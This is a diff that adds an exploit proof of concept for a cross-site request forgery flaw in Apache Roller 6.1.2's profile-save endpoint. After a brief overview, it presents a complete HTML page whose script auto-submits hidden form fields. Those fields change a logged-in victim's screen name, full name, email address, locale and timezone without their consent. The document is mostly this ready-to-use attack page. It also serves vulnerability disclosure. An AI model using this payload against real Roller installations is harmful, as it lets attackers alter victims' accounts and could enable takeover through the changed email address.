@@ -1,0 +1,45 @@
+# Apache Roller v6.1.2 - Cross-Site Request Forgery (CSRF) in Profile Update
+# Version: v6.1.2
+# Date: 2025-11-09
+# Exploit Author: Van Lam Nguyen
+# Facebook: https://www.facebook.com/vanlam1412
+# Vendor Homepage: https://roller.apache.org
+# Software Link: https://github.com/apache/roller/archive/refs/tags/roller-6.1.2.zip
+# Tested on: Windows
+# CVE: N/A 
+
+Overview
+==================================================
+Roller v6.1.2 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint /roller/roller-ui/profile!save.rol. 
+This vulnerability allows attackers to arbitrarily update the victim user's profile information (e.g., email, full name, locale, timezone) via a crafted HTML page
+
+Proof of Concept
+==================================================
+Made an unauthorized request to /roller/roller-ui/profile!save.rol that updates the user's profile without CSRF protection
+<html>
+</head>
+    <form id="exploitForm" action="http://localhost:8080/roller/roller-ui/profile!save.rol" method="POST">
+        <input name="bean.userName" value="vanlam" type="hidden">
+        <input name="bean.screenName" value="hacked" type="hidden">
+        <input name="bean.fullName" value="hacked" type="hidden">
+        <input name="bean.emailAddress" value="hacked@gmail.com" type="hidden">
+        <input name="bean.passwordText" value="" type="hidden">
+        <input name="bean.passwordConfirm" value="" type="hidden">
+        <input name="bean.locale" value="vi_VN" type="hidden">
+        <input name="bean.timeZone" value="Asia/Bangkok" type="hidden">
+    </form>
+
+    <script>
+        document.getElementById('exploitForm').submit();
+    </script>
+</body>
+</html>
+
+bean.userName: vanlam
+bean.screenName: hacked
+bean.fullName: hacked
+bean.emailAddress: hacked@gmail.com
+bean.passwordText: 
+bean.passwordConfirm: 
+bean.locale: vi_VN
+bean.timeZone: Asia/Bangkok
